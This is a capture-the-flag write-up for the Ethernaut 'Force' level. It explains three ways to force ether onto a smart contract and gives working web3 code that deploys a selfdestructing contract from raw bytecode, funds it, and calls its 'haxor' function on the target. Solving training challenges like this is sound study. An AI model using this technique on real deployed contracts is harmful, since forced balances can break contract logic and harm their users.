# Level7 - Force

- [link to challenge](https://ethernaut.zeppelin.solutions/level/0xdf51a9e8ce57e7787e4a27dd19880fd7106b9a5c)

# Issue

You can force funds onto a smart contract three ways:

1. Calling `selfdestruct(targetAddress)` from antoher smart contract with a non zero ether balance
2. Setting the target address as the recipient of a coinbase transaction (i.e., the beneficiary of a newly mined block)
3. By prepopulating the balance of a smart contract address before its actually created because the address is deterministic using `sha3(creatorAddress, nonce)`

# Solution

1. Compile and deploy ForceFunds.sol

```
var forceContract = web3.eth.contract([{"constant":false,"inputs":[{"name":"target","type":"address"}],"name":"haxor","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"payable":true,"stateMutability":"payable","type":"fallback"}]);
var force = forceContract.new(
   {
     from: web3.eth.accounts[0],
     data: '0x6060604052341561000f57600080fd5b60bc8061001d6000396000f300606060405260043610603f576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680639f3776a8146041575b005b3415604b57600080fd5b6075600480803573ffffffffffffffffffffffffffffffffffffffff169060200190919050506077565b005b8073ffffffffffffffffffffffffffffffffffffffff16ff00a165627a7a72305820d040a2a5deb95b532a1a8c0631b8f7ea9980bbabc0f665ee45ec6aff28b603e90029',
     gas: '4700000'
   }, function (e, contract){
    console.log(e, contract);
    if (typeof contract.address !== 'undefined') {
         console.log('Contract mined! address: ' + contract.address + ' transactionHash: ' + contract.transactionHash);
    }
 })
```

2. Send ether to the ForceFunds.sol contract: `web3.eth.sendTransaction({ from: player, to: force.address, value: 1}`

3. Call the `haxor` function: `force.haxor(target, { from: player }, console.info)`
